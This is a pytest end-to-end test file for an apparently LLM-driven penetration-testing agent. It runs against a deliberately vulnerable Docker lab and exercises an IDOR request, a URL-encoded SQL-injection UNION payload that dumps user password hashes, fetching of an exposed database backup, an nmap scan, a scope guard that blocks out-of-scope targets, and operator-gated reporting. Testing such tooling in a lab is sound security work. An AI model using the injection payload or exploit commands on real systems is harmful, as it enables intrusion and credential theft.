"""L5: real mechanical engagement against the docker lab.

Each test scripts the worker to propose a real command, arms autonomous, and
lets the production pipeline (guard -> registry -> execution.run -> ledger) run
it against the running lab, then asserts on the *real* captured output. Nothing
is mocked below the LLM. Assertions are on stable seed data and status/exit
codes, never on tool version strings or byte-exact formatting.

Bring the lab up first: ``cd lab && docker compose up -d --wait`` (or run with
``SKUGGI_E2E_COMPOSE_UP=1``). See docs/lab.md.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from skuggi.agent.protocol import FindingDraft
from skuggi.persistence.ledger import CommandRow
from tests.e2e.conftest import LAB_IP, Lab, Runner, ip_routable, require_tool

pytestmark = [
    pytest.mark.e2e,
    pytest.mark.filterwarnings("ignore::ResourceWarning"),
    pytest.mark.filterwarnings("ignore::pytest.PytestUnraisableExceptionWarning"),
]

# The admin account's unsalted md5 (docs/lab.md); seeded, so a stable oracle.
_ADMIN_MD5 = "482c811da5d5b4bc6d497ffa98491e38"
# The body of the hidden draft post (id=4) in lab/web/db/seed.sql.
_DRAFT_SENTINEL = "remove /backup/db_dump.sql before launch"
# A 7-column UNION dumping users, URL-encoded so the argv token has no spaces.
_SQLI_UNION = (
    "id=0%20UNION%20SELECT%201,username,password,4,email,6,7%20FROM%20users--%20-"
)


def _executed(rows: list[CommandRow]) -> CommandRow:
    """The single executed command row, asserting exactly one ran."""
    executed = [r for r in rows if r.status == "executed"]
    assert len(executed) == 1, [(r.status, r.command) for r in rows]
    return executed[0]


def test_idor_draft_post_is_readable(engage: Runner, lab: Lab) -> None:
    require_tool("curl")
    rows = engage.run(f"curl -s {lab.base_url}/post.php?id=4")
    row = _executed(rows)
    assert row.exit_code == 0
    assert _DRAFT_SENTINEL in row.stdout


def test_public_post_does_not_leak_the_draft(engage: Runner, lab: Lab) -> None:
    require_tool("curl")
    row = _executed(engage.run(f"curl -s {lab.base_url}/post.php?id=1"))
    assert row.exit_code == 0
    assert _DRAFT_SENTINEL not in row.stdout  # id=1 is a public post


def test_sqli_union_dumps_a_known_hash(engage: Runner, lab: Lab) -> None:
    require_tool("curl")
    row = _executed(engage.run(f"curl -s {lab.base_url}/post.php?{_SQLI_UNION}"))
    assert row.exit_code == 0
    assert _ADMIN_MD5 in row.stdout


def test_backup_dump_is_exposed(engage: Runner, lab: Lab) -> None:
    require_tool("curl")
    row = _executed(engage.run(f"curl -s {lab.base_url}/backup/db_dump.sql"))
    assert row.exit_code == 0
    assert _ADMIN_MD5 in row.stdout


def test_nmap_sees_the_web_port(engage: Runner, lab: Lab) -> None:
    require_tool("nmap")
    # -Pn: the lab suppresses ICMP; -sT connect scan needs no root.
    row = _executed(engage.run(f"nmap -Pn -sT -p {lab.port} {lab.host}"))
    assert row.exit_code == 0
    assert f"{lab.port}/tcp open" in row.stdout


def test_out_of_scope_command_is_blocked_while_lab_is_live(
    engage: Runner, lab: Lab
) -> None:
    """The guard is the gate even when a route to the target exists."""
    rows = engage.run("curl -s http://8.8.8.8/")
    assert [r.status for r in rows] == ["blocked"]
    blocked = rows[-1]
    assert blocked.exit_code is None  # nothing ran
    assert "8.8.8.8" in blocked.reason


def test_report_is_produced_from_real_findings(engage: Runner, lab: Lab) -> None:
    finding = FindingDraft(
        title="SQLi UNION dumps password hashes",
        severity="high",
        description="post.php?id= concatenates id into a numeric SQL context.",
        evidence=f"admin hash {_ADMIN_MD5} recovered via UNION",
    )
    command = f"curl -s {lab.base_url}/post.php?{_SQLI_UNION}"
    rows = engage.run(command, findings=(finding,))
    assert _executed(rows).exit_code == 0
    recorded = engage.core.journal.findings()
    assert [f.title for f in recorded] == [finding.title]

    # A report contains only approved findings (the operator gates each one), so
    # approve it before writing -- otherwise it renders as a draft and is excluded.
    engage.core.ledger.set_finding_status(recorded[0].id, "approved")
    report = engage.core.journal.write_report()
    assert isinstance(report, Path)  # Markdown only (no pdf=True)
    text = report.read_text(encoding="utf-8")
    assert finding.title in text
    assert command in text


@pytest.mark.skipif(not ip_routable(), reason=f"{LAB_IP} is not directly routable")
def test_curl_against_the_in_network_ip(engage: Runner, lab: Lab) -> None:
    """Bonus axis: when 192.0.2.10 is routable, the same IDOR works by IP."""
    require_tool("curl")
    row = _executed(engage.run(f"curl -s http://{lab.net_ip}/post.php?id=4"))
    assert row.exit_code == 0
    assert _DRAFT_SENTINEL in row.stdout
